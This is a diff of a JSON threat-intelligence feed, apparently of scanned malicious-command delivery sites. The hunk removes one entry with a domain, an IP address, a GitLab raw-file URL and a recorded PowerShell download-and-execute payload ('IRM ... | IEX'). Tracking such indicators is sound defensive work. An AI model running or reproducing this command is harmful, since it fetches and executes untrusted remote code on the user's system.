@@ -11713,27 +11713,5 @@
     ],
     "ReportId": "cmwi2ffgu0wgc0omlvztx57aj",
     "ScannedAt": "2026-11-15T16:45:14.945000+00:00"
-  },
-  {
-    "UrlDomain": "aipas.fit",
-    "DeliveryUrl": [
-      "biboiboboorl.org"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "69.163.142.38"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
-    ],
-    "ReportId": "cmwhxb9mz0uf80omljhjnf4kl",
-    "ScannedAt": "2026-11-15T14:22:02.682000+00:00"
   }
 ]
